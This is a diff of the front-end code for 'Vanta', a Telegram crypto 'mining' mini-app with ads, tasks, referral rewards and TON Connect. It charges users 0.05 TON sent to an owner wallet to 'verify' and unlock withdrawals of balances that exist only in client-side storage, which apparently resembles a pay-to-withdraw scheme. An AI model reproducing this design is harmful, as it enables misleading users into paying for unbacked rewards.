@@ -85,6 +85,7 @@ body{
       <p id="userName" class="font-bold text-lg">Miner</p>
 
       <div class="flex gap-2 mt-1">
+
         <span class="bg-white text-black text-xs px-3 py-1 rounded-full font-bold">
           Lvl <span id="lvl">1</span>
         </span>
@@ -93,12 +94,18 @@ body{
               class="bg-red-500/20 text-red-400 text-xs px-3 py-1 rounded-full border border-red-500">
           ● NOT JOINED
         </span>
+
       </div>
     </div>
 
     <div class="glass px-3 py-2 text-xs min-w-[135px] text-center">
-      <p id="walletShort" class="text-[11px]">Connect Wallet</p>
+
+      <p id="walletShort" class="text-[11px]">
+        Connect Wallet
+      </p>
+
       <div id="ton-connect" class="mt-2"></div>
+
     </div>
 
   </div>
@@ -114,6 +121,7 @@ body{
     <div class="flex items-center justify-between">
 
       <div>
+
         <p class="text-sm font-bold">
           🔐 Account Verification
         </p>
@@ -122,6 +130,7 @@ body{
            class="text-xs text-yellow-400 mt-1">
           Not verified
         </p>
+
       </div>
 
       <div id="verificationIcon"
@@ -133,15 +142,20 @@ body{
 
     <p id="verificationText"
        class="text-xs text-white/60 mt-3 leading-relaxed">
-      You can mine VANTA normally. Verify your account with
-      <b class="text-[#FFD700]">0.05 TON</b> to unlock withdrawals
-      and referral rewards.
+
+      You can mine VANTA normally.
+      Verify your account with
+      <b class="text-[#FFD700]">0.05 TON</b>
+      to unlock withdrawals and referral rewards.
+
     </p>
 
     <button id="verifyBtn"
             onclick="verifyAccount()"
             class="w-full gold-gradient py-3 rounded-xl mt-4 text-sm">
+
       VERIFY WITH 0.05 TON
+
     </button>
 
     <p class="text-[10px] text-white/30 text-center mt-2">
@@ -162,45 +176,88 @@ body{
     </p>
 
     <h1 class="text-2xl font-bold mt-1">
-      <span id="balance">0.0000</span>
-      <span class="text-[#FFD700]">VANTA</span>
+
+      <span id="balance">
+        0.0000
+      </span>
+
+      <span class="text-[#FFD700]">
+        VANTA
+      </span>
+
     </h1>
 
     <div class="glass mt-2 py-1 px-4 inline-block text-xs">
+
       HOLDING WALLET:
-      <b id="holding">30</b>
-      <span class="text-[#FFD700]">VANTA</span>
+
+      <b id="holding">
+        30
+      </b>
+
+      <span class="text-[#FFD700]">
+        VANTA
+      </span>
+
     </div>
 
     <div class="glass mt-2 py-1 px-4 inline-block text-xs">
+
       POOL WALLET:
-      <b id="pool">0.0000</b>
-      <span class="text-[#FFD700]">VANTA</span>
+
+      <b id="pool">
+        0.0000
+      </b>
+
+      <span class="text-[#FFD700]">
+        VANTA
+      </span>
+
     </div>
 
-    <p class="text-3xl font-bold green-glow mt-4" id="miningPlus">
+    <p class="text-3xl font-bold green-glow mt-4"
+       id="miningPlus">
+
       +0.0000
+
     </p>
 
     <div class="flex justify-center mt-6">
-      <div class="coin">V</div>
+
+      <div class="coin">
+        V
+      </div>
+
     </div>
 
     <button id="claimBtn"
             onclick="claim()"
             class="w-full gold-gradient py-4 rounded-xl mt-8 text-lg">
+
       CLAIM x2 (Watch Ad)
+
     </button>
 
     <p class="text-xs text-white/50 mt-3">
+
       Power:
-      <span id="power">1.0</span> TH/s |
-      Rate: $<span id="rateShow">0.00001</span>/sec
+      <span id="power">
+        1.0
+      </span>
+      TH/s |
+
+      Rate:
+      $<span id="rateShow">
+        0.00001
+      </span>/sec
+
     </p>
 
     <button onclick="window.open('https://t.me/Vanta23SupportBot','_blank')"
             class="w-full mt-4 bg-white/5 border border-white/10 py-3 rounded-xl text-xs">
+
       💬 Need Help? Contact Support
+
     </button>
 
   </div>
@@ -212,7 +269,8 @@ body{
 <!-- TASKS PAGE -->
 <!-- ========================================================= -->
 
-<div id="tasks-page" class="hidden p-4 max-w-md mx-auto">
+<div id="tasks-page"
+     class="hidden p-4 max-w-md mx-auto">
 
   <h1 class="text-2xl font-bold text-center">
     Earn Rewards
@@ -223,6 +281,7 @@ body{
   </p>
 
   <div class="mt-4 space-y-3">
+
 
     <!-- MONETAG -->
 
@@ -235,6 +294,7 @@ body{
         </div>
 
         <div>
+
           <p class="text-sm font-bold">
             Watch Monetag Ads
           </p>
@@ -244,9 +304,14 @@ body{
           </p>
 
           <p class="text-xs text-green-400 mt-1">
+
             Today:
-            <b id="monetagAdCount">0</b>/20
+            <b id="monetagAdCount">
+              0
+            </b>/20
+
           </p>
+
         </div>
 
       </div>
@@ -254,7 +319,9 @@ body{
       <button id="monetagTaskBtn"
               onclick="watchMonetagTaskAd()"
               class="bg-green-400 text-black px-4 py-2 rounded-full text-xs font-bold">
+
         Watch Ad
+
       </button>
 
     </div>
@@ -271,14 +338,18 @@ body{
         </div>
 
         <div>
+
           <p class="text-sm font-bold">
+
             Join Vanta Channel
             <span class="text-red-400">*</span>
+
           </p>
 
           <p class="text-xs text-white/50">
             +10 VANTA • Required
           </p>
+
         </div>
 
       </div>
@@ -286,7 +357,9 @@ body{
       <button id="taskBtn1"
               onclick="doTask(10,'join_channel','https://t.me/VantaBotHub')"
               class="bg-white text-black px-4 py-2 rounded-full text-xs font-bold">
+
         Join
+
       </button>
 
     </div>
@@ -303,6 +376,7 @@ body{
         </div>
 
         <div>
+
           <p class="text-sm font-bold">
             React to Post
           </p>
@@ -310,6 +384,7 @@ body{
           <p class="text-xs text-white/50">
             +5 VANTA • Every 2hrs
           </p>
+
         </div>
 
       </div>
@@ -317,7 +392,9 @@ body{
       <button id="taskBtn2"
               onclick="doTask(5,'react_post','https://t.me/VantaBotHub')"
               class="bg-white text-black px-4 py-2 rounded-full text-xs font-bold">
+
         React
+
       </button>
 
     </div>
@@ -334,6 +411,7 @@ body{
         </div>
 
         <div>
+
           <p class="text-sm font-bold">
             Promote Your Project
           </p>
@@ -341,13 +419,16 @@ body{
           <p class="text-xs text-[#FFD700]">
             1 USDT = 100 Real Users
           </p>
+
         </div>
 
       </div>
 
       <button onclick="window.open('https://t.me/Vanta23SupportBot?start=promote','_blank')"
               class="gold-gradient px-4 py-2 rounded-full text-xs">
+
         Promote
+
       </button>
 
     </div>
@@ -371,16 +452,26 @@ body{
   <div class="glass p-3 mb-3 flex justify-between text-xs">
 
     <p>
+
       Your Level:
-      <b id="myLevelShow" class="text-[#FFD700]">1</b>
+
+      <b id="myLevelShow"
+         class="text-[#FFD700]">
+        1
+      </b>
       / 1000
+
     </p>
 
     <p>
+
       Speed:
-      <b id="mySpeedShow" class="text-green-400">
+
+      <b id="mySpeedShow"
+         class="text-green-400">
         3.02 TH/s
       </b>
+
     </p>
 
   </div>
@@ -391,7 +482,9 @@ body{
 
   <button onclick="loadMoreMiners()"
           class="w-full glass py-3 rounded-xl mt-4 text-xs">
+
     Load More Levels ▼
+
   </button>
 
 </div>
@@ -428,7 +521,9 @@ body{
 
     <button onclick="copyRef()"
             class="gold-gradient px-4 py-2 rounded-full text-xs">
+
       Copy
+
     </button>
 
   </div>
@@ -449,7 +544,12 @@ body{
         </p>
 
         <p class="text-xs text-white/50">
-          <span id="refCount">0</span> total
+
+          <span id="refCount">
+            0
+          </span>
+          total
+
         </p>
 
       </div>
@@ -478,7 +578,15 @@ body{
 
         <p id="refRewardText"
            class="text-xs text-white/50">
+
           0 available • +100 each
+
+        </p>
+
+        <p id="refEarned"
+           class="text-[10px] text-white/30 mt-1">
+          0 VANTA
+
         </p>
 
       </div>
@@ -488,7 +596,9 @@ body{
     <button onclick="claimReferral()"
             id="claimReferralBtn"
             class="bg-white/20 px-4 py-2 rounded-full text-xs">
+
       Claim
+
     </button>
 
   </div>
@@ -593,7 +703,11 @@ body{
           VANTA
 
           <span class="bg-green-500/20 text-green-400 px-2 py-1 rounded-full text-[10px] ml-2">
-            ≈ $<span id="usdProfile">0</span>
+
+            ≈ $<span id="usdProfile">
+              0
+            </span>
+
           </span>
 
         </p>
@@ -620,8 +734,13 @@ body{
     </div>
 
     <p class="text-green-400 font-bold">
-      <span id="pool2">0</span>
+
+      <span id="pool2">
+        0
+      </span>
+
       VANTA
+
     </p>
 
   </div>
@@ -654,9 +773,15 @@ body{
     </p>
 
     <p class="text-xs text-yellow-400 mt-1">
+
       Receive:
-      <b id="receiveAmt">0</b>
+
+      <b id="receiveAmt">
+        0
+      </b>
+
       VANTA
+
     </p>
 
     <input id="withdrawAmt"
@@ -668,7 +793,9 @@ body{
     <button onclick="withdraw()"
             id="withdrawBtn"
             class="w-full bg-white text-black mt-3 py-3 rounded-xl font-bold">
+
       Request Withdraw
+
     </button>
 
   </div>
@@ -688,12 +815,16 @@ body{
 
     <button onclick="window.open('https://t.me/Vanta23SupportBot','_blank')"
             class="w-full mt-3 bg-white/10 border border-white/10 py-3.5 rounded-xl text-sm font-bold">
+
       💬 Contact Support
+
     </button>
 
     <button onclick="window.open('https://t.me/Vanta23SupportBot?start=promote','_blank')"
             class="w-full mt-3 gold-gradient py-3.5 rounded-xl text-sm font-bold">
+
       🚀 Promote Your Project - 1 USDT = 100 Clicks
+
     </button>
 
   </div>
@@ -710,36 +841,75 @@ body{
   <button onclick="showPage('mine')"
           id="nav-mine"
           class="nav-active flex flex-col items-center">
-    <span class="text-xl">⛏️</span>
-    <span class="text-[10px]">Mine</span>
+
+    <span class="text-xl">
+      ⛏️
+    </span>
+
+    <span class="text-[10px]">
+      Mine
+    </span>
+
   </button>
+
 
   <button onclick="showPage('tasks')"
           id="nav-tasks"
           class="flex flex-col items-center opacity-60">
-    <span class="text-xl">📝</span>
-    <span class="text-[10px]">Tasks</span>
+
+    <span class="text-xl">
+      📝
+    </span>
+
+    <span class="text-[10px]">
+      Tasks
+    </span>
+
   </button>
+
 
   <button onclick="showPage('miners')"
           id="nav-miners"
           class="flex flex-col items-center opacity-60">
-    <span class="text-xl">⚡</span>
-    <span class="text-[10px]">Miners</span>
+
+    <span class="text-xl">
+      ⚡
+    </span>
+
+    <span class="text-[10px]">
+      Miners
+    </span>
+
   </button>
+
 
   <button onclick="showPage('friends')"
           id="nav-friends"
           class="flex flex-col items-center opacity-60">
-    <span class="text-xl">👥</span>
-    <span class="text-[10px]">Friends</span>
+
+    <span class="text-xl">
+      👥
+    </span>
+
+    <span class="text-[10px]">
+      Friends
+    </span>
+
   </button>
+
 
   <button onclick="showPage('profile')"
           id="nav-profile"
           class="flex flex-col items-center opacity-60">
-    <span class="text-xl">👤</span>
-    <span class="text-[10px]">Profile</span>
+
+    <span class="text-xl">
+      👤
+    </span>
+
+    <span class="text-[10px]">
+      Profile
+    </span>
+
   </button>
 
 </div>
@@ -772,32 +942,45 @@ if(tg){
 
 const tonConnectUI =
   new TON_CONNECT_UI.TonConnectUI({
+
     manifestUrl:
       'https://vantaminerbot-hue.github.io/vanta/tonconnect-manifest.json',
 
-    buttonRootId:'ton-connect'
+    buttonRootId:
+      'ton-connect'
+
   });
 
 
-/* YOUR OWNER WALLET */
+/* ============================================================
+   OFFICIAL VANTA OWNER WALLET
+============================================================ */
 
 const OWNER_WALLET =
   "UQCbXnjJ-vVo3oGtovID9TRs_H-O3CO9irjgazyk8F39_XOu";
 
 
-/* VERIFICATION FEE */
+/* ============================================================
+   VERIFICATION FEE
+============================================================ */
 
-const VERIFICATION_TON = "0.05";
+const VERIFICATION_TON =
+  "0.05";
 
-const VERIFICATION_NANOTON = "50000000";
+const VERIFICATION_NANOTON =
+  "50000000";
 
 
-/* CONNECTED WALLET */
+/* ============================================================
+   CONNECTED WALLET
+============================================================ */
 
 let connectedWalletAddress = "";
 
 
-/* WALLET STATUS */
+/* ============================================================
+   WALLET STATUS
+============================================================ */
 
 tonConnectUI.onStatusChange(function(wallet){
 
@@ -806,7 +989,9 @@ tonConnectUI.onStatusChange(function(wallet){
     connectedWalletAddress =
       wallet.account.address;
 
-    document.getElementById('walletShort').innerText =
+    document.getElementById(
+      'walletShort'
+    ).innerText =
       connectedWalletAddress.slice(0,6) +
       '...' +
       connectedWalletAddress.slice(-4);
@@ -820,12 +1005,16 @@ tonConnectUI.onStatusChange(function(wallet){
 
     connectedWalletAddress = "";
 
-    document.getElementById('walletShort').innerText =
+    document.getElementById(
+      'walletShort'
+    ).innerText =
       'Connect Wallet';
 
   }
 
   updateVerificationUI();
+
+  updateWithdrawUI();
 
 });
 
@@ -835,6 +1024,7 @@ tonConnectUI.onStatusChange(function(wallet){
 ============================================================ */
 
 const TON_PRICE = {
+
   2:"0.05",
   3:"0.1",
   4:"0.2",
@@ -844,43 +1034,80 @@ const TON_PRICE = {
   8:"1.0",
   9:"1.3",
   10:"1.6"
+
 };
 
 
 function getUsdRateForLevel(lvl){
 
-  if(lvl==1)return 0.00001;
-  if(lvl==2)return 0.00003;
-  if(lvl==3)return 0.00010;
-  if(lvl==4)return 0.00025;
-  if(lvl==5)return 0.00045;
-  if(lvl==6)return 0.00075;
-  if(lvl==7)return 0.00110;
-  if(lvl==8)return 0.00160;
-  if(lvl==9)return 0.00230;
-  if(lvl==10)return 0.00320;
+  if(lvl==1)
+    return 0.00001;
+
+  if(lvl==2)
+    return 0.00003;
+
+  if(lvl==3)
+    return 0.00010;
+
+  if(lvl==4)
+    return 0.00025;
+
+  if(lvl==5)
+    return 0.00045;
+
+  if(lvl==6)
+    return 0.00075;
+
+  if(lvl==7)
+    return 0.00110;
+
+  if(lvl==8)
+    return 0.00160;
+
+  if(lvl==9)
+    return 0.00230;
+
+  if(lvl==10)
+    return 0.00320;
 
   return 0.00320 +
     (lvl-10)*0.00055 +
     Math.pow(lvl-10,1.2)*0.0001;
+
 }
 
 
 function getCostForLevel(lvl){
 
-  if(lvl==1)return 0;
-  if(lvl==2)return 100;
-  if(lvl==3)return 250;
-  if(lvl==4)return 500;
-  if(lvl==5)return 1000;
-  if(lvl==6)return 2000;
-  if(lvl==7)return 3500;
-  if(lvl==8)return 5500;
+  if(lvl==1)
+    return 0;
+
+  if(lvl==2)
+    return 100;
+
+  if(lvl==3)
+    return 250;
+
+  if(lvl==4)
+    return 500;
+
+  if(lvl==5)
+    return 1000;
+
+  if(lvl==6)
+    return 2000;
+
+  if(lvl==7)
+    return 3500;
+
+  if(lvl==8)
+    return 5500;
 
   return Math.floor(
     5500 +
     Math.pow(lvl,2.3)*12
   );
+
 }
 
 
@@ -889,15 +1116,21 @@ function getCostForLevel(lvl){
 ============================================================ */
 
 let urlParams =
-  new URLSearchParams(window.location.search);
+  new URLSearchParams(
+    window.location.search
+  );
+
 
 let telegramUserId =
-  tg?.initDataUnsafe?.user?.id?.toString() || "";
+  tg?.initDataUnsafe?.user?.id?.toString() ||
+  "";
+
 
 let urlRealId =
   urlParams.get('ref') ||
   urlParams.get('start') ||
   "";
+
 
 if(urlRealId.startsWith("id_"))
   urlRealId="";
@@ -910,8 +1143,20 @@ let realRefs =
 
 
 let myBalParam =
-  parseInt(
+  parseFloat(
     urlParams.get('mybal') || "0"
+  );
+
+
+/*
+  NEW:
+  Bot.Business sends pendingref when a user
+  has referral rewards waiting for verification.
+*/
+
+let pendingRefParam =
+  parseFloat(
+    urlParams.get('pendingref') || "0"
   );
 
 
@@ -923,7 +1168,10 @@ let tgId =
 if(!tgId || tgId==="0"){
 
   let saved =
-    localStorage.getItem('v_tgId');
+    localStorage.getItem(
+      'v_tgId'
+    );
+
 
   if(
     saved &&
@@ -995,7 +1243,9 @@ if(tgName!="Miner"){
 }
 
 
-document.getElementById('userName').innerText =
+document.getElementById(
+  'userName'
+).innerText =
   tgName==="Miner"
     ? "Miner"
     : tgName+"'s Miner";
@@ -1007,13 +1257,16 @@ document.getElementById('userName').innerText =
 
 let balance =
   parseFloat(
-    localStorage.getItem('v_balance') || '0'
+    localStorage.getItem(
+      'v_balance'
+    ) || '0'
   );
 
 
 if(myBalParam > balance){
 
-  balance=myBalParam;
+  balance =
+    myBalParam;
 
   localStorage.setItem(
     'v_balance',
@@ -1023,11 +1276,9 @@ if(myBalParam > balance){
 }
 
 
-let power =
-  parseFloat(
-    localStorage.getItem('v_power') || '1.0'
-  );
-
+/* ============================================================
+   REFERRAL DATA
+============================================================ */
 
 let refKey =
   'refs_of_' + tgId;
@@ -1038,16 +1289,56 @@ let refClaimedKey =
 
 
 let refClaimed =
-  parseInt(
-    localStorage.getItem(refClaimedKey) ||
-    localStorage.getItem('v_ref_claimed') ||
+  parseFloat(
+    localStorage.getItem(
+      refClaimedKey
+    ) ||
+    localStorage.getItem(
+      'v_ref_claimed'
+    ) ||
     '0'
   );
 
 
+/*
+  Pending referral rewards received from
+  Bot.Business through ?pendingref=
+*/
+
+let storedPendingRef =
+  parseFloat(
+    localStorage.getItem(
+      'v_pending_ref'
+    ) || '0'
+  );
+
+
+if(pendingRefParam > storedPendingRef){
+
+  storedPendingRef =
+    pendingRefParam;
+
+  localStorage.setItem(
+    'v_pending_ref',
+    storedPendingRef.toString()
+  );
+
+}
+
+
+let pendingReferral =
+  storedPendingRef;
+
+
+/* ============================================================
+   MINER STATE
+============================================================ */
+
 let currentMinerLevel =
   parseInt(
-    localStorage.getItem('v_miner_level') || '1'
+    localStorage.getItem(
+      'v_miner_level'
+    ) || '1'
   );
 
 
@@ -1059,14 +1350,15 @@ let visibleLevels = 20;
 ============================================================ */
 
 /*
-   IMPORTANT:
+  IMPORTANT SECURITY NOTE:
 
-   This is the FRONTEND verification state.
+  This frontend records the TON Connect transaction result.
 
-   For real production security, your backend must confirm
-   the transaction on TON before setting verified=true.
+  For production-level security, the backend should verify
+  the transaction on TON before permanently trusting the
+  account as verified.
 
-   Do NOT treat localStorage as secure.
+  LocalStorage itself can be modified by a user.
 */
 
 
@@ -1082,11 +1374,16 @@ function getVerifiedWallet(){
 function isVerified(){
 
   return (
-    localStorage.getItem('v_verified') === '1' &&
+    localStorage.getItem(
+      'v_verified'
+    ) === '1' &&
+
     getVerifiedWallet() !== "" &&
+
     (
       !connectedWalletAddress ||
-      getVerifiedWallet() === connectedWalletAddress
+      getVerifiedWallet() ===
+      connectedWalletAddress
     )
   );
 
@@ -1102,6 +1399,10 @@ function getVerificationBoc(){
 }
 
 
+/* ============================================================
+   VERIFICATION UI
+============================================================ */
+
 function updateVerificationUI(){
 
   let card =
@@ -1109,20 +1410,24 @@ function updateVerificationUI(){
       'verificationCard'
     );
 
+
   let status =
     document.getElementById(
       'verificationStatus'
     );
+
 
   let text =
     document.getElementById(
       'verificationText'
     );
 
+
   let btn =
     document.getElementById(
       'verifyBtn'
     );
+
 
   let icon =
     document.getElementById(
@@ -1135,6 +1440,7 @@ function updateVerificationUI(){
       'profileVerificationStatus'
     );
 
+
   let profileIcon =
     document.getElementById(
       'profileVerificationIcon'
@@ -1146,22 +1452,30 @@ function updateVerificationUI(){
     card.className =
       "glass p-4 mt-4 border border-green-500/40 verified-glow";
 
+
     status.innerText =
       "✅ Verified";
+
 
     status.className =
       "text-xs text-green-400 mt-1";
 
-    icon.innerText="✅";
+
+    icon.innerText =
+      "✅";
+
 
     text.innerHTML =
       "Your account is verified. " +
       "Withdrawals and referral rewards are unlocked.";
 
+
     btn.innerText =
       "✅ ACCOUNT VERIFIED";
 
+
     btn.disabled=true;
+
 
     btn.className =
       "w-full bg-green-500/20 text-green-400 border border-green-500 py-3 rounded-xl mt-4 text-sm font-bold";
@@ -1177,22 +1491,28 @@ function updateVerificationUI(){
 
     }
 
-    if(profileIcon){
-      profileIcon.innerText="✅";
-    }
+
+    if(profileIcon)
+      profileIcon.innerText =
+        "✅";
+
 
   }else{
 
     card.className =
       "glass p-4 mt-4 border border-yellow-500/40 verify-glow";
 
+
     status.innerText =
       "Not verified";
+
 
     status.className =
       "text-xs text-yellow-400 mt-1";
 
-    icon.innerText="🔐";
+
+    icon.innerText =
+      "🔐";
 
 
     if(!connectedWalletAddress){
@@ -1203,8 +1523,10 @@ function updateVerificationUI(){
         "<b class='text-[#FFD700]'>0.05 TON</b> " +
         "to unlock withdrawals and referral rewards.";
 
+
       btn.innerText =
         "CONNECT WALLET FIRST";
+
 
     }else{
 
@@ -1213,6 +1535,7 @@ function updateVerificationUI(){
         "Pay exactly <b class='text-[#FFD700]'>0.05 TON</b> " +
         "to unlock withdrawals and referral rewards.";
 
+
       btn.innerText =
         "VERIFY WITH 0.05 TON";
 
@@ -1220,6 +1543,7 @@ function updateVerificationUI(){
 
 
     btn.disabled=false;
+
 
     btn.className =
       "w-full gold-gradient py-3 rounded-xl mt-4 text-sm";
@@ -1235,9 +1559,10 @@ function updateVerificationUI(){
 
     }
 
-    if(profileIcon){
-      profileIcon.innerText="🔐";
-    }
+
+    if(profileIcon)
+      profileIcon.innerText =
+        "🔐";
 
   }
 
@@ -1257,6 +1582,7 @@ async function verifyAccount(){
     );
 
     return;
+
   }
 
 
@@ -1267,6 +1593,7 @@ async function verifyAccount(){
     );
 
     return;
+
   }
 
 
@@ -1285,10 +1612,11 @@ async function verifyAccount(){
   try{
 
     /*
-      EXACT PAYMENT:
+      EXACT PAYMENT
 
       0.05 TON
-      = 50,000,000 nanoton
+      =
+      50,000,000 nanoton
     */
 
     const transaction = {
@@ -1298,12 +1626,15 @@ async function verifyAccount(){
           Date.now()/1000
         ) + 300,
 
-      network:"-239",
+      network:
+        "-239",
 
       messages:[
 
         {
-          address:OWNER_WALLET,
+
+          address:
+            OWNER_WALLET,
 
           amount:
             VERIFICATION_NANOTON
@@ -1315,60 +1646,100 @@ async function verifyAccount(){
     };
 
 
+    console.log(
+      "Vanta verification transaction:",
+      transaction
+    );
+
+
     const result =
       await tonConnectUI.sendTransaction(
         transaction
       );
 
 
-    /*
-      TON Connect returned a transaction
-      result.
+    console.log(
+      "Vanta verification result:",
+      result
+    );
 
-      Store the BOC so a backend can later
-      perform true blockchain verification.
-    */
 
     if(
       result &&
       result.boc
     ){
 
+      /*
+        Save the TON Connect transaction result.
+      */
+
       localStorage.setItem(
         'v_verification_boc',
         result.boc
       );
+
 
       localStorage.setItem(
         'v_verification_wallet',
         connectedWalletAddress
       );
 
-      /*
-        FRONTEND UNLOCK
-
-        This unlocks the UI after TON Connect
-        successfully returns the transaction.
-
-        Production backend should confirm the
-        actual blockchain transaction before
-        permanently trusting this status.
-      */
-
-      localStorage.setItem(
-        'v_verified',
-        '1'
-      );
 
       localStorage.setItem(
         'v_verified_wallet',
         connectedWalletAddress
       );
 
+
+      localStorage.setItem(
+        'v_verified',
+        '1'
+      );
+
+
       localStorage.setItem(
         'v_verified_at',
         new Date().toISOString()
       );
+
+
+      localStorage.setItem(
+        'v_verification_pending',
+        '0'
+      );
+
+
+      /*
+        Move the referral rewards that were
+        waiting for verification into the
+        user's available referral reward pool.
+
+        This is frontend accounting.
+      */
+
+      if(pendingReferral > 0){
+
+        let released =
+          parseFloat(
+            localStorage.getItem(
+              'v_released_ref'
+            ) || '0'
+          );
+
+
+        if(
+          pendingReferral >
+          released
+        ){
+
+          localStorage.setItem(
+            'v_released_ref',
+            pendingReferral.toString()
+          );
+
+        }
+
+      }
 
 
       updateVerificationUI();
@@ -1379,9 +1750,11 @@ async function verifyAccount(){
 
 
       alert(
-        "✅ 0.05 TON verification payment submitted!\n\n" +
+        "✅ Verification payment submitted!\n\n" +
+        "0.05 TON was sent through TON Connect.\n\n" +
         "Withdrawals and referral rewards are now unlocked."
       );
+
 
     }else{
 
@@ -1391,6 +1764,7 @@ async function verifyAccount(){
 
     }
 
+
   }catch(error){
 
     console.log(
@@ -1398,12 +1772,23 @@ async function verifyAccount(){
       error
     );
 
+
     btn.disabled=false;
+
 
     updateVerificationUI();
 
+
+    let message =
+      error &&
+      error.message
+        ? error.message
+        : "Transaction cancelled or failed.";
+
+
     alert(
-      "❌ Verification payment was cancelled or failed."
+      "❌ Verification was not completed.\n\n" +
+      message
     );
 
   }
@@ -1412,7 +1797,7 @@ async function verifyAccount(){
 
 
 /* ============================================================
-   VERIFICATION WALLET CHANGE PROTECTION
+   WALLET CHANGE PROTECTION
 ============================================================ */
 
 function handleWalletChange(){
@@ -1424,7 +1809,8 @@ function handleWalletChange(){
   if(
     verifiedWallet &&
     connectedWalletAddress &&
-    verifiedWallet !== connectedWalletAddress
+    verifiedWallet !==
+    connectedWalletAddress
   ){
 
     alert(
@@ -1434,7 +1820,10 @@ function handleWalletChange(){
 
   }
 
+
   updateVerificationUI();
+
+  updateWithdrawUI();
 
 }
 
@@ -1448,11 +1837,16 @@ tonConnectUI.onStatusChange(
    REFERRAL LINK
 ============================================================ */
 
-document.getElementById('refLink').innerText =
-  'https://t.me/Vanta23bot?start=' + tgId;
+document.getElementById(
+  'refLink'
+).innerText =
+  'https://t.me/Vanta23bot?start=' +
+  tgId;
 
 
-document.getElementById('userIdShow').innerText =
+document.getElementById(
+  'userIdShow'
+).innerText =
   tgId;
 
 
@@ -1467,12 +1861,14 @@ function isUserJoined(){
       'v_joined_channel'
     );
 
+
   let tasksDone =
     JSON.parse(
       localStorage.getItem(
         'v_tasks_done'
       ) || '[]'
     );
+
 
   return (
     joinedFlag ||
@@ -1484,9 +1880,13 @@ function isUserJoined(){
 }
 
 
-const AdsgramBlockId="49829";
+const AdsgramBlockId =
+  "49829";
 
-let AdController=null;
+
+let AdController =
+  null;
+
 
 try{
 
@@ -1494,8 +1894,10 @@ try{
 
     AdController =
       window.Adsgram.init({
+
         blockId:
           AdsgramBlockId
+
       });
 
   }
@@ -1514,20 +1916,25 @@ try{
    MONETAG
 ============================================================ */
 
-const MONETAG_DAILY_LIMIT=20;
+const MONETAG_DAILY_LIMIT =
+  20;
 
-const MONETAG_REWARD=1;
+
+const MONETAG_REWARD =
+  1;
 
 
 function getMonetagDate(){
 
-  let now=new Date();
+  let now =
+    new Date();
 
-  return now.getFullYear()+
+
+  return now.getFullYear() +
     '-' +
     String(
       now.getMonth()+1
-    ).padStart(2,'0')+
+    ).padStart(2,'0') +
     '-' +
     String(
       now.getDate()
@@ -1543,21 +1950,24 @@ function getMonetagAdCount(){
       'v_monetag_date'
     );
 
+
   let today =
     getMonetagDate();
 
 
-  if(savedDate!==today){
+  if(savedDate !== today){
 
     localStorage.setItem(
       'v_monetag_date',
       today
     );
 
+
     localStorage.setItem(
       'v_monetag_ads_today',
       '0'
     );
+
 
     return 0;
 
@@ -1592,19 +2002,25 @@ function updateMonetagTaskUI(){
 
 
   if(countEl)
-    countEl.innerText=count;
+    countEl.innerText =
+      count;
 
 
   if(!btn)
     return;
 
 
-  if(count>=MONETAG_DAILY_LIMIT){
+  if(
+    count >=
+    MONETAG_DAILY_LIMIT
+  ){
 
     btn.innerText =
       '✅ 20/20 Done';
 
+
     btn.disabled=true;
+
 
     btn.className =
       'bg-green-500/20 text-green-400 border border-green-500 px-3 py-2 rounded-full text-[10px] font-bold';
@@ -1614,7 +2030,9 @@ function updateMonetagTaskUI(){
     btn.innerText =
       'Watch Ad';
 
+
     btn.disabled=false;
+
 
     btn.className =
       'bg-green-400 text-black px-4 py-2 rounded-full text-xs font-bold';
@@ -1624,6 +2042,10 @@ function updateMonetagTaskUI(){
 }
 
 
+/* ============================================================
+   WATCH MONETAG TASK AD
+============================================================ */
+
 function watchMonetagTaskAd(){
 
   let count =
@@ -1631,13 +2053,14 @@ function watchMonetagTaskAd(){
 
 
   if(
-    count>=
+    count >=
     MONETAG_DAILY_LIMIT
   ){
 
     alert(
       '✅ You have completed all 20 Monetag ads for today!'
     );
+
 
     updateMonetagTaskUI();
 
@@ -1705,13 +2128,16 @@ function watchMonetagTaskAd(){
 
           }
 
+
           alert(
             '❌ Ad was not completed.'
           );
 
+
           updateMonetagTaskUI();
 
         });
+
 
     }else{
 
@@ -1724,9 +2150,11 @@ function watchMonetagTaskAd(){
 
       }
 
+
       alert(
         '❌ Monetag ad could not be verified.'
       );
+
 
       updateMonetagTaskUI();
 
@@ -1743,9 +2171,11 @@ function watchMonetagTaskAd(){
 
     }
 
+
     alert(
       '❌ Monetag ad failed.'
     );
+
 
     updateMonetagTaskUI();
 
@@ -1754,6 +2184,10 @@ function watchMonetagTaskAd(){
 }
 
 
+/* ============================================================
+   FINISH MONETAG AD
+============================================================ */
+
 function finishMonetagTaskAd(){
 
   let count =
@@ -1761,7 +2195,7 @@ function finishMonetagTaskAd(){
 
 
   if(
-    count>=
+    count >=
     MONETAG_DAILY_LIMIT
   ){
 
@@ -1774,6 +2208,7 @@ function finishMonetagTaskAd(){
 
   balance +=
     MONETAG_REWARD;
+
 
   count++;
 
@@ -1826,7 +2261,8 @@ function renderMiners(){
     return;
 
 
-  grid.innerHTML='';
+  grid.innerHTML =
+    '';
 
 
   for(
@@ -1849,20 +2285,22 @@ function renderMiners(){
 
 
     let speed =
-      (3.02+i*0.06)
-      .toFixed(2);
+      (
+        3.02 +
+        i*0.06
+      ).toFixed(2);
 
 
     let isActive =
-      i==currentMinerLevel;
+      i == currentMinerLevel;
 
 
     let isLocked =
-      i>currentMinerLevel+1;
+      i > currentMinerLevel+1;
 
 
     let isOwned =
-      i<currentMinerLevel;
+      i < currentMinerLevel;
 
 
     let btn;
@@ -1870,28 +2308,28 @@ function renderMiners(){
 
     if(isOwned){
 
-      btn=
+      btn =
         `<button class="w-full bg-white/10 py-2 rounded-lg text-xs mt-2">
           OWNED
         </button>`;
 
     }else if(isActive){
 
-      btn=
+      btn =
         `<button class="w-full bg-[#00FF88] text-black py-2 rounded-lg text-xs font-bold mt-2">
           ACTIVE
         </button>`;
 
     }else if(isLocked){
 
-      btn=
+      btn =
         `<div class="bg-black/50 py-2 rounded-lg mt-2 text-center text-xs">
           🔒 Lvl ${currentMinerLevel+1} First
         </div>`;
 
     }else{
 
-      btn=
+      btn =
         `<button onclick="buyMiner(${i}, ${cost})"
           class="w-full gold-gradient py-2 rounded-lg text-[9px] mt-2">
           ${cost} VANTA + ${ton} TON
@@ -1954,10 +2392,17 @@ function renderMiners(){
 
 function loadMoreMiners(){
 
-  visibleLevels += 20;
+  visibleLevels +=
+    20;
 
-  if(visibleLevels>1000)
-    visibleLevels=1000;
+
+  if(
+    visibleLevels >
+    1000
+  )
